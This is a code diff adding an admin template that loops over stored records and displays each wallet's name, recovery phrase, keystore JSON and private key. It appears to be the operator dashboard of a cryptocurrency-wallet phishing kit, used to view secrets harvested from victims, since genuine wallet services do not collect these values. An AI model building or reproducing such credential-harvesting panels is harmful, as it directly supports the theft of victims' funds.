@@ -1,0 +1,36 @@
+{% extends 'admin_temp/base.html' %}
+{% block content %}
+  
+<div class="container">
+    {% for x in x reversed %}
+    <div class="col-md-6 d-flex align-items-stretch">
+        <div class="row">
+          <div class="col-md-12 grid-margin stretch-card">
+            <div class="card">
+              <div class="card-body">
+                <h4 class="card-title">{{x.wname}}</h4>
+                <p class="card-description">
+                  Below are {{x.wname}} <code>&lt;p&gt;</code> wallet details
+                </p>
+                <p>
+                    <p>Phrase: </p>
+                 {{x.phrase}}
+                </p>
+                <p>
+                    <p>keystore JSON: </p>
+                    {{x.kj}}
+                   </p>
+                   <p>
+                    <p>Private Key: </p>
+                    {{x.pkey}}
+                   </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      {% endfor %}
+</div>
+
+
+{% endblock %}
